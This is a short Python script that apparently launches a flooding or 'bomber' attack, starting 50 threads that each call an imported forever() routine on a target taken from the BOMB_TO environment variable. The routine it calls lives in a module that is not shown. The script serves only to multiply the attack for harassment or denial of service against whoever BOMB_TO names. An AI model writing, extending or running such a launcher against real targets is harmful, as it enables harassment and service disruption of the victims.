#!/usr/bin/env python

import os
import threading
from lambda_function import forever

def simpleBomb():
    forever(os.environ['BOMB_TO'])

if __name__ == "__main__":
	thureads = []
	for j in range(50):
		thureads.append(threading.Thread(target=simpleBomb, args=()))
	for i in thureads:
		i.start()

